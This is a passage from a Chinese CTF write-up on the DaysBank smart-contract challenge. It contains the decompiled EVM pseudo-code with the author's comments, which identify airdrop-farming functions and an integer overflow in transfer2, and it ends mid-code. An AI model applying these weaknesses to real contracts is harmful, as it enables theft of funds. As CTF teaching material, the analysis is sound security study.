class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract DaysBank &#123;</span><br><span class=\"line\">    mapping(<span class=\"function\"><span class=\"params\">address</span> =&gt;</span> uint) public balanceOf;</span><br><span class=\"line\">    mapping(<span class=\"function\"><span class=\"params\">address</span> =&gt;</span> uint) public gift;</span><br><span class=\"line\">    address owner;</span><br><span class=\"line\">        </span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>()public&#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    event SendFlag(uint256 flagnum, string b64email);</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">payforflag</span>(<span class=\"params\">string b64email</span>) <span class=\"title\">public</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">require</span>(balanceOf[msg.sender] &gt;= <span class=\"number\">10000</span>);</span><br><span class=\"line\">        emit SendFlag(<span class=\"number\">1</span>,b64email);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"解题过程\"><a href=\"#解题过程\" class=\"headerlink\" title=\"解题过程\"></a>解题过程</h2><p>首先访问ropsten这个合约的地址，发现没有个源代码，遂要对合约逆向。这个工具超好用：<a href=\"https://ethervm.io/decompile\" target=\"_blank\" rel=\"noopener\">https://ethervm.io/decompile</a> 。可以逆出来很好看的伪代码。我不怎么会re，所以下面的一些注释都是个人理解，有不对的地方望大佬们指正。</p>\n<h3 id=\"逆向结果和注释\"><a href=\"#逆向结果和注释\" class=\"headerlink\" title=\"逆向结果和注释\"></a>逆向结果和注释</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Public Methods</span><br><span class=\"line\">Method names cached <span class=\"keyword\">from</span> <span class=\"number\">4</span>byte.directory.</span><br><span class=\"line\"><span class=\"number\">0x652e9d91</span> Unknown</span><br><span class=\"line\"><span class=\"number\">0x66d16cc3</span> profit()</span><br><span class=\"line\"><span class=\"number\">0x6bc344bc</span> Unknown</span><br><span class=\"line\"><span class=\"number\">0x70a08231</span> balanceOf(address)</span><br><span class=\"line\"><span class=\"number\">0x7ce7c990</span> transfer2(address,uint256)</span><br><span class=\"line\"><span class=\"number\">0xa9059cbb</span> transfer(address,uint256)</span><br><span class=\"line\"><span class=\"number\">0xcbfc4bce</span> Unknown</span><br></pre></td></tr></table></figure>\n<p>上面有三个Unknown，分别是以下三个。</p>\n<ul>\n<li>Init第一次薅羊毛</li>\n<li>giftOf 得到用户的gift的值</li>\n<li>sendFlag，得到flag的函数</li>\n</ul>\n<p>理解这些，会更好的看懂下面的代码</p>\n<blockquote>\n<p>00-20 放地址，20-40放0x01的时候，用storage访问，求的是gift的值<br>即 storage[keccak256(memory[0x00:0x40])] = storage[keccak256( 地址+0x01 )] 是gift[address]<br>00-20 放地址，20-40放0x00的时候，用storage访问，求的是balance的值<br>即 storage[keccak256(memory[0x00:0x40])] = storage[keccak256( 地址+0x00 )] 是balance[address]</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract Contract &#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">main</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 没用上</span></span><br><span class=\"line\">        memory[<span class=\"number\">0x40</span>:<span class=\"number\">0x60</span>] = <span class=\"number\">0x80</span>;</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\">// 根据tx的data字段，判断执行什么函数</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (msg.data.length &lt; <span class=\"number\">0x04</span>) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">var</span> var0 = msg.data[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] / <span class=\"number\">0x0100000000000000000000000000000000000000000000000000000000</span> &amp; <span class=\"number\">0xffffffff</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (var0 == <span class=\"number\">0x652e9d91</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Dispatch table entry for 0x652e9d91 (unknown)</span></span><br><span class=\"line\">            <span class=\"comment\">// 薅羊毛，类似于 Init()，让新用户的balanceOf和gift都变为1</span></span><br><span class=\"line\">            <span class=\"keyword\">var</span> var1 = msg.value;</span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (var1) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">            var1 = <span class=\"number\">0x009c</span>;</span><br><span class=\"line\">            func_01DC();</span><br><span class=\"line\">            stop();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (var0 == <span class=\"number\">0x66d16cc3</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Dispatch table entry for profit()</span></span><br><span class=\"line\">            <span class=\"comment\">// profit() 薅羊毛第二步，让balanceOf为1和gift为1的账户，都变为2.</span></span><br><span class=\"line\">            var1 = msg.value;</span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"comment\">// 非payable</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (var1) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">            var1 = <span class=\"number\">0x009c</span>;</span><br><span class=\"line\">            profit();</span><br><span class=\"line\">            stop();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (var0 == <span class=\"number\">0x6bc344bc</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Dispatch table entry for 0x6bc344bc (unknown)</span></span><br><span class=\"line\">            <span class=\"comment\">// payforflag() 最后获得flag的函数，不用逆</span></span><br><span class=\"line\">            var1 = msg.value;</span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (var1) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"keyword\">var</span> temp0 = memory[<span class=\"number\">0x40</span>:<span class=\"number\">0x60</span>];</span><br><span class=\"line\">            <span class=\"keyword\">var</span> temp1 = msg.data[<span class=\"number\">0x04</span>:<span class=\"number\">0x24</span>];</span><br><span class=\"line\">            <span class=\"keyword\">var</span> temp2 = msg.data[temp1 + <span class=\"number\">0x04</span>:temp1 + <span class=\"number\">0x04</span> + <span class=\"number\">0x20</span>];</span><br><span class=\"line\">            memory[<span class=\"number\">0x40</span>:<span class=\"number\">0x60</span>] = temp0 + (temp2 + <span class=\"number\">0x1f</span>) / <span class=\"number\">0x20</span> * <span class=\"number\">0x20</span> + <span class=\"number\">0x20</span>;</span><br><span class=\"line\">            memory[temp0:temp0 + <span class=\"number\">0x20</span>] = temp2;</span><br><span class=\"line\">            var1 = <span class=\"number\">0x009c</span>;</span><br><span class=\"line\">            memory[temp0 + <span class=\"number\">0x20</span>:temp0 + <span class=\"number\">0x20</span> + temp2] = msg.data[temp1 + <span class=\"number\">0x24</span>:temp1 + <span class=\"number\">0x24</span> + temp2];</span><br><span class=\"line\">            <span class=\"keyword\">var</span> var2 = temp0;</span><br><span class=\"line\">            func_0278(var2);</span><br><span class=\"line\">            stop();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (var0 == <span class=\"number\">0x70a08231</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Dispatch table entry for balanceOf(address)</span></span><br><span class=\"line\">            <span class=\"comment\">// balanceOf() 获得用户余额</span></span><br><span class=\"line\">            var1 = msg.value;</span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (var1) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">            var1 = <span class=\"number\">0x013a</span>;</span><br><span class=\"line\">            var2 = msg.data[<span class=\"number\">0x04</span>:<span class=\"number\">0x24</span>] &amp; <span class=\"number\">0xffffffffffffffffffffffffffffffffffffffff</span>;</span><br><span class=\"line\">            var2 = balanceOf(var2);</span><br><span class=\"line\">        </span><br><span class=\"line\">        label_013A:</span><br><span class=\"line\">            <span class=\"keyword\">var</span> temp3 = memory[<span class=\"number\">0x40</span>:<span class=\"number\">0x60</span>];</span><br><span class=\"line\">            memory[temp3:temp3 + <span class=\"number\">0x20</span>] = var2;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> temp4 = memory[<span class=\"number\">0x40</span>:<span class=\"number\">0x60</span>];</span><br><span class=\"line\">            <span class=\"keyword\">return</span> memory[temp4:temp4 + temp3 - temp4 + <span class=\"number\">0x20</span>];</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (var0 == <span class=\"number\">0x7ce7c990</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Dispatch table entry for transfer2(address,uint256)</span></span><br><span class=\"line\">            <span class=\"comment\">// transfer2() 要求用户的balance大于等于3时可以用的转账，有整数溢出漏洞</span></span><br><span class=\"line\">            var1 = msg.value;</span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (var1) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">            var1 = <span class=\"number\">0x009c</span>;</span><br><span class=\"line\">            var2 = msg.data[<span class=\"number\">0x04</span>:<span class=\"number\">0x24</span>] &amp; <span class=\"number\">0xffffffffffffffffffffffffffffffffffffffff</span>;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> var3 = msg.data[<span class=\"number\">0x24</span>:<span class=\"number\">0x44</span>];</span><br><span class=\"line\">            transfer2(var2, var3);</span><br><span class=\"line\">            stop();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (var0 == <span class=\"number\">0xa9059cbb</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Dispatch table entry for transfer(address,uint256)</span></span><br><span class=\"line\">            <span class=\"comment\">// transfer() 没有漏洞的transfer() 但要求balance大于2</span></span><br><span class=\"line\">            var1 = msg.value;</span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (var1) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">            var1 = <span class=\"number\">0x009c</span>;</span><br><span class=\"line\">            var2 = msg.data[<span class=\"number\">0x04</span>:<span class=\"number\">0x24</span>] &amp; <span class=\"number\">0xffffffffffffffffffffffffffffffffffffffff</span>;</span><br><span class=\"line\">            var3 = msg.data[<span class=\"number\">0x24</span>:<span class=\"number\">0x44</span>];</span><br><span class=\"line\">            transfer(var2, var3);</span><br><span class=\"line\">            stop();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (var0 == <span class=\"number\">0xcbfc4bce</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Dispatch table entry for 0xcbfc4bce (unknown)</span></span><br><span class=\"line\">            <span class=\"comment\">// 好像是返回用户的 gift值 就是map publice gift。这个变量</span></span><br><span class=\"line\">            var1 = msg.value;</span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (var1) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">            var1 = <span class=\"number\">0x013a</span>;</span><br><span class=\"line\">            var2 = msg.data[<span class=\"number\">0x04</span>:<span class=\"number\">0x24</span>] &amp; <span class=\"number\">0xffffffffffffffffffffffffffffffffffffffff</span>;</span><br><span class=\"line\">            var2 = func_0417(var2);</span><br><span class=\"line\">            goto label_013A;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// init</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func_01DC</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = msg.sender;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x01</span>;</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\">// gift要为0，指新用户</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (storage[keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>])]) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"comment\">// gift和balance都变为1，薅第一次羊毛</span></span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = msg.sender;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x00</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> temp0 = keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>]);</span><br><span class=\"line\">        storage[temp0] = storage[temp0] + <span class=\"number\">0x01</span>;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x01</span>;</span><br><span class=\"line\">        storage[keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>])] = <span class=\"number\">0x01</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">profit</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = msg.sender;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x00</span>;</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\">//balanceOf 必须是1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (storage[keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>])] != <span class=\"number\">0x01</span>) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = msg.sender;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x01</span>;</span><br><span class=\"line\">        <span class=\"comment\">// gift 必须是1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (storage[keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>])] != <span class=\"number\">0x01</span>) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"comment\">// 都加1</span></span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = msg.sender;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x00</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> temp0 = keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>]);</span><br><span class=\"line\">        storage[temp0] = storage[temp0] + <span class=\"number\">0x01</span>;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x01</span>;</span><br><span class=\"line\">        storage[keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>])] = <span class=\"number\">0x02</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// getFlag，太长了不看，反正给了源码</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func_0278</span>(<span class=\"params\">var arg0</span>) </span>&#123;</span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = msg.sender;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x00</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"number\">0x2710</span> &gt; storage[keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>])]) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">var</span> var0 = <span class=\"number\">0xb1bc9a9c599feac73a94c3ba415fa0b75cbe44496bfda818a9b4a689efb7adba</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> var1 = <span class=\"number\">0x01</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> temp0 = arg0;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> var2 = temp0;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> temp1 = memory[<span class=\"number\">0x40</span>:<span class=\"number\">0x60</span>];</span><br><span class=\"line\">        <span class=\"keyword\">var</span> var3 = temp1;</span><br><span class=\"line\">        memory[var3:var3 + <span class=\"number\">0x20</span>] = var1;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> temp2 = var3 + <span class=\"number\">0x20</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> var4 = temp2;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> temp3 = var4 + <span class=\"number\">0x20</span>;</span><br><span class=\"line\">        memory[var4:var4 + <span class=\"number\">0x20</span>] = temp3 - var3;</span><br><span class=\"line\">        memory[temp3:temp3 + <span class=\"number\">0x20</span>] = memory[var2:var2 + <span class=\"number\">0x20</span>];</span><br><span class=\"line\">        <span class=\"keyword\">var</span> var5 = temp3 + <span class=\"number\">0x20</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> var7 = memory[var2:var2 + <span class=\"number\">0x20</span>];</span><br><span class=\"line\">        <span class=\"keyword\">var</span> var6 = var2 + <span class=\"number\">0x20</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> var8 = var7;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> var9 = var5;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> var10 = var6;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> var11 = <span class=\"number\">0x00</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (var11 &gt;= var8) &#123;</span><br><span class=\"line\">        label_02FD:</span><br><span class=\"line\">            <span class=\"keyword\">var</span> temp4 = var7;</span><br><span class=\"line\">            var5 = temp4 + var5;</span><br><span class=\"line\">            var6 = temp4 &amp; <span class=\"number\">0x1f</span>;</span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!var6) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> temp5 = memory[<span class=\"number\">0x40</span>:<span class=\"number\">0x60</span>];</span><br><span class=\"line\">                log(memory[temp5:temp5 + var5 - temp5], [stack[<span class=\"number\">-7</span>]]);</span><br><span class=\"line\">                <span class=\"keyword\">return</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> temp6 = var6;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> temp7 = var5 - temp6;</span><br><span class=\"line\">                memory[temp7:temp7 + <span class=\"number\">0x20</span>] = ~(<span class=\"number\">0x0100</span> ** (<span class=\"number\">0x20</span> - temp6) - <span class=\"number\">0x01</span>) &amp; memory[temp7:temp7 + <span class=\"number\">0x20</span>];</span><br><span class=\"line\">                <span class=\"keyword\">var</span> temp8 = memory[<span class=\"number\">0x40</span>:<span class=\"number\">0x60</span>];</span><br><span class=\"line\">                log(memory[temp8:temp8 + (temp7 + <span class=\"number\">0x20</span>) - temp8], [stack[<span class=\"number\">-7</span>]]);</span><br><span class=\"line\">                <span class=\"keyword\">return</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        label_02EE:</span><br><span class=\"line\">            <span class=\"keyword\">var</span> temp9 = var11;</span><br><span class=\"line\">            memory[temp9 + var9:temp9 + var9 + <span class=\"number\">0x20</span>] = memory[temp9 + var10:temp9 + var10 + <span class=\"number\">0x20</span>];</span><br><span class=\"line\">            var11 = temp9 + <span class=\"number\">0x20</span>;</span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (var11 &gt;= var8) &#123; goto label_02FD; &#125;</span><br><span class=\"line\">            <span class=\"keyword\">else</span> &#123; goto label_02EE; &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">balanceOf</span>(<span class=\"params\">var arg0</span>) <span class=\"title\">returns</span> (<span class=\"params\">var arg0</span>) </span>&#123;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x00</span>;</span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = arg0;</span><br><span class=\"line\">        <span 